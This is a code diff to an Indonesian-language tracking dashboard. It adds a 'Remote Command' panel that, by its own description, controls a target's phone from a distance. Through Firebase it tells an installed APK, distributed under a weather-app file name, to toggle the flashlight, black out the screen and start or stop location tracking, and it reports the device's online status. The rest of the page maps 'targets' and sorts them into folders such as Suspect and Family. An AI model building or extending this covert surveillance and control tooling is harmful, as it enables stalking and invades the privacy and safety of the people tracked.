@@ -385,6 +385,27 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 #pwaInstallBtn.show{display:block}
 #pwaInstallBtn:active{transform:scale(.95)}
 @keyframes pwaBounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+/* ============ REMOTE CONTROL PANEL ============ */
+.rc-btn-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
+.rc-btn{width:100%;background:transparent;color:var(--gold);border:1px solid var(--gold-d);font-family:'Courier New',monospace;font-size:11px;font-weight:bold;letter-spacing:1px;padding:12px 8px;cursor:pointer;border-radius:var(--radius);text-transform:uppercase;transition:all .15s}
+.rc-btn:hover{border-color:var(--gold);background:rgba(0,229,138,.08)}
+.rc-btn.on{background:var(--gold);color:#000;border-color:var(--gold);box-shadow:0 0 12px rgba(0,229,138,.4)}
+.rc-btn.off{border-color:rgba(255,51,85,.4);color:var(--red)}
+.rc-btn.off:hover{border-color:var(--red);background:rgba(255,51,85,.08)}
+.rc-btn.off.active{background:var(--red);color:#fff;border-color:var(--red);box-shadow:0 0 12px rgba(255,51,85,.5)}
+.rc-section{border:1px solid var(--border2);border-radius:var(--radius);padding:12px;margin-bottom:10px;background:var(--bg3)}
+.rc-section-title{font-size:11px;color:var(--gold);font-weight:bold;letter-spacing:2px;margin-bottom:10px;text-transform:uppercase}
+.rc-status{font-size:10px;color:var(--text-d);text-align:center;padding:8px;background:var(--bg);border-radius:var(--radius);margin-top:8px;letter-spacing:1px}
+.rc-status.on{color:var(--green);border:1px solid rgba(0,229,138,.3)}
+.rc-status.off{color:var(--red);border:1px solid rgba(255,51,85,.3)}
+.rc-status.pending{color:var(--amber);border:1px solid rgba(255,143,0,.3);animation:rcBlink 1s infinite}
+@keyframes rcBlink{0%,100%{opacity:1}50%{opacity:.4}}
+.rc-info-grid{display:grid;grid-template-columns:1fr;gap:6px;margin-top:10px;font-size:10px}
+.rc-info-row{display:flex;justify-content:space-between;padding:6px 10px;background:var(--bg);border-left:2px solid var(--gold-d)}
+.rc-info-row .rck{color:var(--text-d);letter-spacing:1px}
+.rc-info-row .rcv{color:var(--cyan);font-weight:bold}
+.rc-info-row .rcv.online{color:var(--green)}
+.rc-info-row .rcv.offline{color:var(--red)}
 </style>
 </head>
 <body>
@@ -558,6 +579,47 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 </div>
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">CSV</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">JSON</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">Clear</button></div></div>
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">Buka Google Maps</button></div>
+
+<!-- ═══ REMOTE CONTROL PANEL (BARU) ═══ -->
+<div class="term-body">
+  <div class="prompt">[Control] Remote Command</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:12px">› Kontrol HP target dari jarak jauh. Perintah dikirim via Firebase, dieksekusi APK dalam 30 detik.</div>
+
+  <div class="rc-section">
+    <div class="rc-section-title">🔦 Senter</div>
+    <div class="rc-btn-row">
+      <button class="rc-btn on" id="rcSenterOn" onclick="kirimPerintah('senter','on')">SENTER ON</button>
+      <button class="rc-btn off" id="rcSenterOff" onclick="kirimPerintah('senter','off')">SENTER OFF</button>
+    </div>
+    <div class="rc-status pending" id="rcSenterStatus">Status APK: -</div>
+  </div>
+
+  <div class="rc-section">
+    <div class="rc-section-title">🖤 Layar HP</div>
+    <div class="rc-btn-row">
+      <button class="rc-btn off" id="rcLayarOn" onclick="kirimPerintah('layar','black')">KUNCI LAYAR</button>
+      <button class="rc-btn on" id="rcLayarOff" onclick="kirimPerintah('layar','normal')">BUKA LAYAR</button>
+    </div>
+    <div class="rc-status pending" id="rcLayarStatus">Status APK: -</div>
+  </div>
+
+  <div class="rc-section">
+    <div class="rc-section-title">📍 Tracking Lokasi</div>
+    <div class="rc-btn-row">
+      <button class="rc-btn on" id="rcTrackOn" onclick="kirimPerintah('tracking','on')">TRACK ON</button>
+      <button class="rc-btn off" id="rcTrackOff" onclick="kirimPerintah('tracking','off')">TRACK OFF</button>
+    </div>
+    <div class="rc-status pending" id="rcTrackStatus">Status APK: -</div>
+  </div>
+
+  <div class="rc-info-grid">
+    <div class="rc-info-row"><span class="rck">TERAKHIR UPDATE</span><span class="rcv" id="rcLastUpdate">-</span></div>
+    <div class="rc-info-row"><span class="rck">DEVICE</span><span class="rcv" id="rcDevice">-</span></div>
+    <div class="rc-info-row"><span class="rck">STATUS APK</span><span class="rcv" id="rcApkStatus">-</span></div>
+  </div>
+</div>
+<!-- ═══ END REMOTE CONTROL PANEL ═══ -->
+
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">Download APK</button></a></div>
 <div class="term-body" id="toolsPanel">
   <div class="prompt">[Tools] Utility Panel</div>
@@ -683,15 +745,14 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body" id="compassPanel"><div class="prompt">[Nav] Kompas Target</div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">› isi koordinat tujuan, klik MULAI — ikuti petunjuk arah, jarum & jarak.</div><div style="display:flex;gap:8px;margin-bottom:10px"><button class="term-btn outline" id="cmpModeKoord" onclick="setCompassMode('koordinat')" style="margin:0">Koordinat</button><button class="term-btn outline" id="cmpModeUtm" onclick="setCompassMode('utm')" style="margin:0">UTM</button></div><div id="cmpRowKord"><div class="geo-row"><input id="cmpLat" class="geo-inp" placeholder="Latitude (-6.2...)" type="number" step="any"><input id="cmpLng" class="geo-inp" placeholder="Longitude (106.8...)" type="number" step="any"></div></div><div id="cmpRowUtm" style="display:none"><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› contoh: <b style="color:var(--cyan)">54M</b> · <b style="color:var(--cyan)">222161</b> · <b style="color:var(--cyan)">9497555</b></div><div class="geo-row"><input id="cmpZoneT" class="geo-inp" placeholder="Zona (54M)" autocomplete="off" style="max-width:96px"><input id="cmpEast" class="geo-inp" placeholder="Easting" type="number" step="any"><input id="cmpNorth" class="geo-inp" placeholder="Northing" type="number" step="any"></div></div><div style="display:flex;gap:8px;margin-bottom:10px"><button class="term-btn" onclick="startCompass()" style="margin:0">Mulai</button><button class="term-btn danger" onclick="stopCompass()" style="margin:0;flex:0 0 auto;width:auto;padding:0 18px">Stop</button></div><button class="term-btn outline" onclick="compassLatest()" style="margin:0 0 12px">Pakai Target Terbaru</button><div class="cmp-wrap"><div class="cmp-dial"><div class="cmp-ticks"></div><div class="cmp-rose" id="cmpRose"><span class="rl u">U</span><span class="rl t">T</span><span class="rl s">S</span><span class="rl b">B</span><span class="rl d tl">TL</span><span class="rl d tg">TG</span><span class="rl d bd">BD</span><span class="rl d bl">BL</span></div><div class="cmp-needle" id="cmpNeedle"><div class="nd-up"></div><div class="nd-dn"></div></div><div class="cmp-cap"></div><div class="cmp-topmark">▲</div></div><div class="cmp-read"><div class="cmp-dist" id="cmpDist">--</div><div class="cmp-sub" id="cmpBear">BEARING --</div></div></div><div class="cmp-guide" id="cmpGuide"><span class="g-arrow" id="cmpArrow">◈</span><span class="g-txt" id="cmpGuideTxt">Isi tujuan lalu klik MULAI — petunjuk arah menuju koordinat akan muncul di sini</span></div><div class="term-info" style="margin-top:12px"><div><span class="k">TUJUAN</span><span class="v" id="cmpTarget">-</span></div><div><span class="k">POSISI</span><span class="v" id="cmpPos">-</span></div><div><span class="k">POSISI UTM</span><span class="v" id="cmpUtm">-</span></div><div><span class="k">AKURASI</span><span class="v" id="cmpAcc">-</span></div><div><span class="k">HEADING</span><span class="v" id="cmpHead">-</span></div></div><div class="geo-status" id="cmpStatus" style="margin-top:10px;margin-bottom:0">Siap — isi tujuan lalu MULAI</div></div>
 </div>
 <div class="chat-panel" id="chatPanel"><div class="chat-inner"><div class="chat-head"><span class="title" id="chatTitle">◉ PRIVATE CHAT</span><button class="chat-pick" onclick="pilihLawan()">👥 Ganti</button><button class="chat-close" onclick="closeChat()">✕ Close</button></div><div class="chat-msgs" id="chatMsgs"><div class="empty">Pilih lawan bicara dulu</div></div><div class="chat-input-row"><input id="chatInput" placeholder="ketik pesan..." oninput="typingSound()" onkeypress="if(event.key==='Enter')sendChat()"><button onclick="sendChat()">KIRIM</button></div></div></div>
-
 <script type="module">
 import{initializeApp}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-import{getDatabase,ref,onValue,push,remove}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+import{getDatabase,ref,onValue,push,remove,set}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 const FC={apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",authDomain:"roraxbali-65802.firebaseapp.com",databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"roraxbali-65802",storageBucket:"roraxbali-65802.firebasestorage.app",messagingSenderId:750633313866,appId:"1:750636313866:web:3d2e552960e06db83968b3"};
 const app=initializeApp(FC);const db=getDatabase(app);
 const user=localStorage.getItem('username');if(!user)location.href='index.html';
 document.getElementById('userLabel').innerText=user;
-window.user=user;window.db=db;window.ref=ref;window.onValue=onValue;window.push=push;window.remove=remove;
+window.user=user;window.db=db;window.ref=ref;window.onValue=onValue;window.push=push;window.remove=remove;window.set=set;
 const wv=document.getElementById('welcomeVideo');
 if(wv){wv.muted=true;wv.volume=0;wv.play().catch(()=>{document.body.addEventListener('click',function o(){wv.play();document.body.removeEventListener('click',o)},{once:true})});wv.addEventListener('ended',()=>{wv.currentTime=0;wv.play()})}
 let soundEnabled=localStorage.getItem('soundEnabled')!=='false';
@@ -728,6 +789,7 @@ function apkUpdateSound(){let n=0;const t=setInterval(()=>{beep(1200,0.06);n++;i
 function chatNotifSound(){let n=0;const t=setInterval(()=>{beep(1800,0.08);setTimeout(()=>beep(2400,0.08),100);n++;if(n>=6)clearInterval(t)},500)}
 function linkDataSound(){let n=0;const t=setInterval(()=>{beep(1400,0.08);setTimeout(()=>beep(1800,0.08),100);n++;if(n>=10)clearInterval(t)},500)}
 function geoSound(){beep(800,.15);setTimeout(()=>beep(1200,.15),200);setTimeout(()=>beep(1600,.2),400);setTimeout(()=>beep(2000,.3),700)}
+function rcBeep(){beep(1400,.08);setTimeout(()=>beep(1900,.08),100);setTimeout(()=>beep(2400,.1),200)}
 window.playKlik=playKlik;window.typingSound=typingSound;
 window.logout=()=>{playKlik();localStorage.removeItem('username');location.href='index.html'};
 setInterval(()=>{const n=new Date();document.getElementById('liveClock').innerText=String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0')+':'+String(n.getSeconds()).padStart(2,'0')},1000);
@@ -801,6 +863,108 @@ function checkGeofence(){if(!geofence)return;allData.forEach(([key,d])=>{if(!d.l
 window.saveNote=(key)=>{localStorage.setItem('note_'+user+'_'+key,document.getElementById('note_'+key)?.value||'');addLog('Note saved');actLog('📝 Catatan disimpan: '+key,'note')};
 function getNote(key){return localStorage.getItem('note_'+user+'_'+key)||''}
 window.getNote=getNote;
+
+// ═══════════════════════════════════════════════
+// REMOTE CONTROL — Fungsi Kirim Perintah ke APK
+// ═══════════════════════════════════════════════
+window.kirimPerintah = async function(kategori, aksi) {
+  try {
+    if (typeof rcBeep === 'function') rcBeep();
+    if (window.addLog) addLog('📡 Kirim perintah: ' + kategori + '=' + aksi, 'warn');
+    if (window.actLog) actLog('📡 Remote: ' + kategori + '=' + aksi, 'link');
+
+    const waktu = Date.now();
+    const url = 'https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app/perintah/'
+                + encodeURIComponent(user) + '/' + kategori + '.json';
+
+    const res = await fetch(url, {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ aksi: aksi, waktu: waktu })
+    });
+
+    if (res.ok) {
+      if (window.addLog) addLog('✅ Perintah ' + kategori + '=' + aksi + ' terkirim', 'ok');
+      const statusId = 'rc' + kategori.charAt(0).toUpperCase() + kategori.slice(1) + 'Status';
+      const el = document.getElementById(statusId);
+      if (el) {
+        el.textContent = 'Status APK: menunggu...';
+        el.className = 'rc-status pending';
+      }
+    } else {
+      if (window.addLog) addLog('❌ Gagal kirim perintah: HTTP ' + res.status, 'err');
+    }
+  } catch (e) {
+    if (window.addLog) addLog('❌ Error kirim perintah: ' + e.message, 'err');
+  }
+};
+
+// Dengarkan status perintah & lokasi APK realtime
+function initRemoteStatusListener() {
+  const cmdRef = ref(db, 'perintah/' + user);
+  onValue(cmdRef, snap => {
+    const data = snap.val();
+    if (!data) return;
+
+    if (data.senter) {
+      const el = document.getElementById('rcSenterStatus');
+      if (el && data.senter.aksi) {
+        const on = data.senter.aksi === 'on';
+        el.textContent = 'Status APK: ' + (on ? '🔥 SENTER NYALA' : '⚫ SENTER MATI');
+        el.className = 'rc-status ' + (on ? 'on' : 'off');
+      }
+    }
+    if (data.layar) {
+      const el = document.getElementById('rcLayarStatus');
+      if (el && data.layar.aksi) {
+        const black = data.layar.aksi === 'black';
+        el.textContent = 'Status APK: ' + (black ? '🖤 LAYAR TERKUNCI' : '✅ LAYAR NORMAL');
+        el.className = 'rc-status ' + (black ? 'off' : 'on');
+      }
+    }
+    if (data.tracking) {
+      const el = document.getElementById('rcTrackStatus');
+      if (el && data.tracking.aksi) {
+        const on = data.tracking.aksi === 'on';
+        el.textContent = 'Status APK: ' + (on ? '📍 TRACKING AKTIF' : '⏸ TRACKING NONAKTIF');
+        el.className = 'rc-status ' + (on ? 'on' : 'off');
+      }
+    }
+  });
+}
+
+// Dengarkan lokasi terbaru untuk status "Terakhir Update" & Device
+function initApkInfoListener() {
+  const lokRef = ref(db, 'lokasi/' + user);
+  onValue(lokRef, snap => {
+    const data = snap.val();
+    if (!data) return;
+    const arr = Object.entries(data).filter(([,d]) => d.mode).sort((a,b) => b[1].waktu - a[1].waktu);
+    if (!arr.length) return;
+    const lt = arr[0][1];
+    const waktu = lt.waktu || 0;
+    const selisih = Date.now() - waktu;
+    const menit = Math.floor(selisih / 60000);
+    const statusEl = document.getElementById('rcApkStatus');
+    const updEl = document.getElementById('rcLastUpdate');
+    const devEl = document.getElementById('rcDevice');
+    if (updEl) updEl.textContent = new Date(waktu).toLocaleString('id-ID');
+    if (devEl) devEl.textContent = lt.device || '-';
+    if (statusEl) {
+      if (menit < 15) {
+        statusEl.textContent = '🟢 ONLINE (' + menit + ' menit lalu)';
+        statusEl.className = 'rcv online';
+      } else if (menit < 60) {
+        statusEl.textContent = '🟡 IDLE (' + menit + ' menit lalu)';
+        statusEl.className = 'rcv';
+      } else {
+        statusEl.textContent = '🔴 OFFLINE (' + Math.floor(menit/60) + ' jam lalu)';
+        statusEl.className = 'rcv offline';
+      }
+    }
+  });
+}
+
 let mapApk=null,markerApk=null,lastApkCnt=0,firstApk=true;
 function initMapApk(){mapApk=L.map('mapApk',{zoomControl:false,attributionControl:false,dragging:true,scrollWheelZoom:true}).setView([-4.5,138.5],14);addSatLayer(mapApk)}
 initMapApk();
@@ -810,7 +974,6 @@ let currentLink='';window.currentLink='';
 function linkBase(){let c='';try{c=(document.getElementById('baseUrlCustom').value||'').trim()}catch(e){}c=c.replace(/\/+$/,'');if(!c)return location.origin;if(!/^[a-z]+:\/\//i.test(c))c='https://'+c;return c}
 function saveBase(){try{localStorage.setItem('baseUrlCustom_'+user,(document.getElementById('baseUrlCustom').value||'').trim())}catch(e){}}
 
-// Dua URL foto resmi yang langsung bisa dipakai tanpa mencari-cari link GitHub.
 const PHOTO_PRESET_URLS={
   photoPreset1:'https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/images.jpg',
   photoPreset2:'https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/malam.jpg'
@@ -842,7 +1005,6 @@ window.usePhotoPreset=function(id){
   if(window.beep)beep(1800,0.06);
 };
 
-// Link generator selalu dibuat dengan masa berlaku 24 jam.
 function generatorExpiryMinutes(){
   const el=document.getElementById('linkExpiry');
   const mins=el?parseInt(el.value,10):1440;
@@ -1203,6 +1365,11 @@ onValue(ref(db,'lokasi/'+user),snap=>{
   renderData();
 });
 
+// ═══════ INIT REMOTE CONTROL LISTENER ═══════
+initRemoteStatusListener();
+initApkInfoListener();
+// ═════════════════════════════════════════════
+  
 let compassMode='koordinat',cmpActive=false,cmpTarget=null,cmpPos=null,cmpHeadSensor=null,cmpWatch=null,cmpOriHandler=null,cmpOriEvt=null,cmpArrived=false;
 window.setCompassMode=(m)=>{compassMode=m;document.getElementById('cmpRowKord').style.display=m==='koordinat'?'block':'none';document.getElementById('cmpRowUtm').style.display=m==='utm'?'block':'none';document.getElementById('cmpModeKoord').style.background=m==='koordinat'?'rgba(0,229,138,.15)':'';document.getElementById('cmpModeUtm').style.background=m==='utm'?'rgba(0,229,138,.15)':''};
 function parseZona(v){v=String(v==null?'':v).trim().toUpperCase();const m=v.match(/(\d{1,2})/);if(!m)return null;const zone=parseInt(m[1],10);if(zone<1||zone>60)return null;let hemi='S';const L=(v.match(/[A-Z]/)||[])[0];if(L==='N')hemi='N';else if(L&&'PQRSTUVWX'.indexOf(L)>=0)hemi='N';return{zone:zone,hemi:hemi}}
@@ -1341,12 +1508,8 @@ setTimeout(renderSessions,2000);
 })();
 </script>
 <script>
-/* ═══════════════════════════════════════════════
-   CYBER TERMINAL — PWA Bootstrap
-   ═══════════════════════════════════════════════ */
 (function(){
   'use strict';
-
   if ('serviceWorker' in navigator) {
     window.addEventListener('load', () => {
       navigator.serviceWorker.register('/sw.js')
@@ -1366,10 +1529,8 @@ setTimeout(renderSessions,2000);
         .catch(err => console.warn('[PWA] SW gagal daftar:', err));
     });
   }
-
   const offlineBanner = document.getElementById('pwaOfflineBanner');
   const onlineBanner = document.getElementById('pwaOnlineBanner');
-
   function showOffline() {
     if (!offlineBanner) return;
     offlineBanner.classList.add('show');
@@ -1377,7 +1538,6 @@ setTimeout(renderSessions,2000);
     if (window.addLog) addLog('⚠ Koneksi terputus — mode offline', 'warn');
     if (window.beep) beep(600, 0.15);
   }
-
   function showOnline() {
     if (!onlineBanner) return;
     onlineBanner.classList.add('show');
@@ -1386,14 +1546,11 @@ setTimeout(renderSessions,2000);
     if (window.addLog) addLog('✓ Koneksi kembali — data tersinkron', 'ok');
     if (window.beep) beep(1800, 0.10);
   }
-
   window.addEventListener('offline', showOffline);
   window.addEventListener('online', showOnline);
   if (!navigator.onLine) showOffline();
-
   let deferredPrompt = null;
   const installBtn = document.getElementById('pwaInstallBtn');
-
   window.addEventListener('beforeinstallprompt', (e) => {
     e.preventDefault();
     deferredPrompt = e;
@@ -1403,7 +1560,6 @@ setTimeout(renderSessions,2000);
     }
     if (window.addLog) addLog('Aplikasi bisa di-install ke home screen', 'ok');
   });
-
   window.pwaInstall = async function() {
     if (!deferredPrompt) {
       alert('Untuk install:\n\nAndroid Chrome: Menu ⋮ → "Install app"\niOS Safari: Share → "Add to Home Screen"');
@@ -1418,12 +1574,10 @@ setTimeout(renderSessions,2000);
     }
     deferredPrompt = null;
   };
-
   if (window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true) {
     if (installBtn) installBtn.style.display = 'none';
     if (window.addLog) addLog('Berjalan sebagai PWA (standalone mode)', 'ok');
   }
-
   if ('serviceWorker' in navigator) {
     navigator.serviceWorker.addEventListener('message', (e) => {
       if (e.data && e.data.type === 'SYNC_NOW') {
@@ -1431,13 +1585,11 @@ setTimeout(renderSessions,2000);
       }
     });
   }
-
   window.addEventListener('online', () => {
     if (window.renderData) setTimeout(() => window.renderData(), 500);
     if (window.updateMultiMap) setTimeout(() => window.updateMultiMap(), 800);
     if (window.refreshGlobeMarkers) setTimeout(() => window.refreshGlobeMarkers(), 1000);
   });
-
   console.log('%c[PWA] Bootstrap selesai','color:#00e58a;font-weight:bold');
 })();
 </script>
